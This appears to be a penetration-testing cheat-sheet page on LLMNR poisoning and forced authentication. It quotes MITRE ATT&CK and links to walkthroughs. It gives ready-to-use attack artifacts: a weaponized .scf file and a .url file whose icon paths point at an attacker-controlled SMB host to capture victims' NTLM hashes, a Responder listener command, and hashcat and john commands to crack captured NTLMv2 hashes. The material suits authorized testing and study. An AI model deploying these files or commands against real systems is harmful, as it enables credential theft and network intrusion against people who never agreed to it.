---
description: Credential Access, Stealing hashes
---

# LLMNR Poisoning/Forced Authentication

## LLMNR Poisoning

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks" %}

{% embed url="https://attack.mitre.org/techniques/T1557/001/" %}

> By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.
>
> Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. [\[1\]](https://en.wikipedia.org/wiki/Link-Local\_Multicast\_Name\_Resolution)[\[2\]](https://technet.microsoft.com/library/cc958811.aspx)
>
> Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.
>
> In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.[\[3\]](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)[\[4\]](https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.&#x20;
>
> Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).

### via SSRF

{% embed url="https://lojique.gitbook.io/proving-grounds/v/heist/web-enum/website" %}

## Forced Authentication

{% embed url="https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication" %}

### Execution via .SCF

Place the below `.scf` file on the attacker controlled machine in a shared folder

{% code title="pwn.scf" %}
```csharp
[Shell]
Command=2
IconFile=\\192.168.123.123\home\kali\pwn.scf
[Taskbar]
Command=ToggleDesktop
```
{% endcode %}

Create a listener on the attacking system:

{% code title="attacker@local" %}
```
responder -I eth1 -v
```
{% endcode %}

### Execution via .URL

Create a weaponized .url file and upload it to the victim system:

```csharp
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\192.168.123.123\%USERNAME%.icon
IconIndex=1
```

Create a listener on the attacking system:

{% code title="attacker@local" %}
```
responder -I eth1 -v
```
{% endcode %}

## Example

{% embed url="https://lojique.gitbook.io/proving-grounds/v/vault/other-services-enumeration/445-smb" %}

## Cracking NTLMv2

```
hashcat -m 5600 'pasted hash' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt ntlmhash.txt
```
